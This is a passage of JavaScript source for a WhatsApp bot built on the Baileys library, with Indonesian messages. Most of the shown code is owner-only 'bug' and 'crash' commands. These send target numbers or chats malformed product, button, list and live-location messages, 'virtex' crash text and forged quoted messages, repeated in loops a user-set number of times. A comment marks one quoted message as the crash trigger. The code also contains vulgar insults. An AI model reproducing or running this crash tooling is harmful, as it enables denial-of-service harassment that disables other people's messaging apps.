├❒ dance
├❒ happy
├❒ handhold 
├❒ darkjoke
├❒ meme
└❒ meme2

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'beritanews': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


sound157
sound158
sound159
sound160
sound161

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
case 'audiocrash':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": mekih
            } 
        } 
    }
 ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {audio: ro, mimetype: 'audio/mpeg', ptt:false }, {quoted:doc})
 }
await reply(`Succes`)
break
case 'stikercrash':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": mekih
            } 
        } 
    }
 hey = fs.readFileSync('./baseikal/virtex/kontol.webp')
haikal.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await reply(`Succes`)
}
break
case 'vncrash':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": mekih
            } 
        } 
    }
 ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
await reply(`Succes`)
break
case 'bugbutton':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]

const buttonMessage = {
    text: "BUG BY 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH",
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage)
}
}
break
case 'bugcatalogv2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${buttonvirus}`,
"description": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"url": "wa.me/6285814480623"
},
"businessOwnerJid": "6285814480623@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ctlg })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'bugcatalogv3': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia(
{ image: fs.readFileSync('./pict.jpg') }, 
{ upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "KONTOL",
"fileLength": "99999999999",
"jpegThumbnail": mekih,
"title": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"description": `💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤${virtex2}`,
"currencyCode": "IDR",
"productImageCount": 923456789,
"firstImageId": 1,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",  
"bodyText": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"footerText": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"retailerId": `CATALOG NEW`,
"url": "https://youtube.com/channel/YRxchSagDYGdgvcasyjjbEWECdf"
},
"businessOwnerJid": "6285814480623@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: shield2 })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'buglist':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)
if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')

touchmebre = [
{
title: `🌷 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
haikal.sendListMsg(m.chat, `🌷 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH 🌷`, haikal.user.name, `HAY KAK SC BOT ADA DI LIST`, `CLICK HERE 🌷`, touchmebre, m)
break
case 'bugbuttonv2':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonfour}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonfour}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: buttonfour}, type: 1}
]

const buttonMessage = {
    text: `${four}`,
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage,  { quoted: a })
}
}
break
case 'buglivelocv3':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
res = generateWAMessageFromContent(m.chat,{
"liveLocationMessage": {
"degreesLatitude": -7.8374838,
"degreesLongitude": 727.8383838,
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 \n\n${philips} ${virtex3}`,
"sequenceNumber": "1532280505",
"thumbnail": mekih,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: {key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
liveLocationMessage: {
caption: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}, contextInfo:{}}) 
haikal.relayMessage(m.chat, res.message, { messageId: res.key.id,})
}
break
case 'buglivelocv2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"liveLocationMessage": {
						"degreesLatitude": -6.9366881,
						"degreesLongitude": 107.7228148,
						"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips} ${ngazap(prefix)}`,
						"sequenceNumber": "1657997490287001",
						"jpegThumbnail": "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"
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
case 'sendliveloc': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"liveLocationMessage": {
						"degreesLatitude": -6.9366881,
						"degreesLongitude": 107.7228148,
						"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips} ${ngazap(prefix)}`,
						"sequenceNumber": "1657997490287001",
						"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQAZAMBIgACEQEDEQH/xAAcAAABBAMBAAAAAAAAAAAAAAAAAQIDBAUGBwj/xAA7EAACAQMDAQUECAQGAwAAAAABAgMABBEFEiExBhMiQVEjYXGRFBUygaGxwfAHUtHhJDNCU4LxQ0Ri/8QAGwEBAAMBAQEBAAAAAAAAAAAAAAECAwQFBgf/xAAmEQACAgEEAQMFAQAAAAAAAAAAAQIRAwQSITFRBQYiEzJBcbGB/9oADAMBAAIRAxEAPwD0GunXj/5t1HGPSKPJ+ZP6VdtLaO1tp1XeyP4TvYsXb1zVknAJPQUwD/JU9VTefix/7rkwaDBglugufLbf96/w1yZ55FTfA2K3ijjRFjUBVCjipaKK7bsxCiimTzRW8TSzyJFEvLO7BQPiTUAnHSoXeRLWARsUPclunmAP61Rtdc0u9Zo7HUrG5kAOUhnVz8gayjQybYSqqwVNpBOPT+lYQi0m0aSTTqSoZctJ3jZjVo+Mbo9w6e6ltVR45D3apnKErxxj8Kj7uWPokyAfytkfLP6Uomd7WQFwwJEatjBOev4VuZiW74Cny8skA48vwqnpthZ6Wpjsxb/Sd3t3jHtCGyV3EksegGSecVe6VqfaS4GmapK8d7eWsV2gnnKPDGhcARr43BYZ2qDjpkHjNSQzbaKhsCrafatEZnjaJWVp2LOQRnxE+fNFQSPZe8IiHV+D7h5mnEiWZngkR93+k8Hj09ar3kvcWl5MOqR7R8T+xUkUQW3jjcBtqgc+4VNcWRfNDyWX7cci/wDHP5UgkQnAYZ9M80Bdv2Gdfgx/KnFpSMF1cejoD+WKgkZPMlvBJNMwWKNS7MfIAZJrzr2u7S3ev6i89y7R26MTFCTxEP6+p+PlgDvevWbX+hajZxQxrJcW0kSsjFcFlIHH315kv4WkSWLxIx4wwwQfQ15vqE5JKK6Z9V7YwY5ynkkrkuggu0kb2UuWU7vv9a7f/C7tLNrttNaak5lu7ZRslY+J4/efMg+fnkdTk1wCws5YrjvJMKBnzzmutfwVtX+ub2+YlYY7cw5PQszKR9/gPzHrXNo5OOVRi+Get67ihl0UsmVVJdHYoyUmi8bhS2DliR0Pr78UNBIsjttAXcz7mfCj3/HFKQGGDgg0IALOUbwgZtvPIA6Y/frXtn5+M3D/AHo/uUmsP2jtbm5S0ksIIriaJyGlEMfeopH/AI+98Oc4rMK2XADBxjqFIx86enFxF78gfHH9jQdmK0W6OmWCwzxa3cyMzSFriHe65JwpKZXgAdOPniirTXTRBRxkjJyfM9fxoqSBL0g28EZGe/myR6gHH5VcqvJFuvolJ8NvGBj/AOiOvyz86sVL6SC7YUUUVUkK4z/Fvs39C1D61s4z9HuG9sAOEk65+Dcn4g+ors1Y7X9LTWdMudPbg3CEBvJSOQ2PccGsc+JZYOLO707Wy0WeOVdfn9Hm2xtZr27htrZDJNKwRFHmScD/ALr0X2X0dezuiwWNswZ+DKSOJJDgE+uPIc8AD0rmn8GNMS41m7v5UI+ixr3YbyZ8jPxAVh/yrsQIEu88iJS5+PQfrXLoMO2O99s9f3Hr3mzLBH7Y/wBYFAGIaFkOcbojwfupfZLE0bySZLbt3dkfpWo6YCt/26DcMHViD77frWI0TUtWFhpmn6bc21vDD2fjviZbfvSWDMMDkYzgeteltPmN50XbHtz9IfHX7P8AakHdB1Y3OdpB+zWitrl9ciXU7G3tlvvqCC9Ps8lvaOXQHrjAOB61Lf8Aa+4azvLyxSOWznvodPsj3BkIJTMjlV5fqQAPMYqNrG9G5tGneyhgDhj+PP60Vrej65qUkdwL/Sby5dJSsdwLSS371NqkEowyDkkenFFKZO5Gajuz9YzQzLtEjFoX8nA6j48VdqhqMHeSWJQf4cS94c9VKg8fOrrbgAXdIgegYZY/dVpVSaIjdtMdRQqO+O7ZHU/6um34ilMcw6IJAehQj9aoWEojfu0M23cznagzjj95/Cju5X8G0JngksMgUjMrzNtxsj8Cj09f37qAx2laRpukd/8AVsX0Pv33yB8spPuJPA9BnHurIMpVNrFS0rZO05G0f3/Oldtqk4z6D1pFhZHIXuWk/wBSr4WH9ahJLhFpScncnbNV7Ujsqur7daM6X80CtItutx7WLJUb+6GGHBHNZqwtdIv0j1HT4opo5bT6GkkLMF7gE+AAHAwc+WR0rAagmpt/EsDSpLSCX6nTvDdRs4C9+/QKw56edYjWrObQ10axluon06Y3E1xNPcSWcUk7HcAzICVGCdq9Dj3VejG65o32x0ixsXja0tNhS2WzGWZh3SkkLgk+ZPPWqp0PSbbRPq1rILpMCPJ3YZsqQd+4NncGznnOa0rS7WTUtTsLXVb6W8QaJNJ3lvcSqshFxhGJ8JbCkckckZ5qnFfpeWGnHtJfTxwNou+0b6Q8Yln3MCSVI3Pjbwc9enNTQ3LwbnpmoaFp2n27wJeSR3kYuhJJFNcO+4YyzeLnw9M0VznWbqeDTOzawzSxqdJhOEcgZy1FTssr9SjslmZILeQzuJSDkEqAN58h7ulSRRmSYqWOcbnYdfcPz+VPVg4WO3ZSo4KSL9seuaVhGqMIoy8WfGUY7gRWbduzZKhsZghmYtJmT7O5lwF+NRzMs0rFsupOEUDIIHniprx4h3bP3ilhw6r5ehzTU9nFJMsgckbEO3GDn9/KgGxr3CSShAjt4EGMff8Av0pGJY+1jWQ/zA7WpXZtpEgWVBz4+CPgaRtqNxuC7A5DHO2gCM4O+TkRLuPvbyH791EcQfAlAYk5PxowQscZ+0fav+g/fpUkf2xQGt6X2t0+bQrG/v7mHThewSOkE027G1tvBwM/3rIy61pNpplvPeajZJb3jAxO0g2yAY6fr6ZrWeyfZ/UtPk7Kve2yxixtLmOcmRD3bu+VHB5yPSoNA0XWNA+prubS3vDFbXNrJbpLHmEvOXV8k4wV4ODwKtSKKUjP6V2rtJ+yWn6tq1zb6ebokhXk4OGIIGeTwKu6j2g0uySBrvU7ONZU76JnfIZf5lx16+VanoGjar2fj0G4m097uW2sZbSW1ikjLxM0u5XGSAQQMHB8/jVvsr2dv9O1XR5LuJO6gs7iOXY6lYXkl3iMeZwDjIGOKNIJyNyt5hdW8c8F7HJDIoZHRcqwPQg5ormUfYHWrvRtHRtR+rpra17mSDvM+LvHbOVyOjDz8qKbV5G6Xg6dFuCNJGgeTds2/wAq5/f4UhIR3jtx3ahuWByTx0+FKMpMsW4hYx3srDjJ9Kaz94d0sXJ6FDhh/WqlwZ5EVmL7/VWGQaknVB3cSNHGy+LYeAc+/wCdNiRWIfvQ0SHc2Rhhj1/OmuyyndNAfF5o3OPeKAHSRsRtG43EAnqMefIpJPaSv6O4QfAcH8jUneYeWdZSyhf8s5GDxjimQ4jdS2SIkLn49P60Bodl2p1DVNavdAtbtI9SOpXCm4aNP8PaxtwFBGGcgEDIPmTWw6r2lh0zUlt7qzuhb95HC10zIoLNgAhM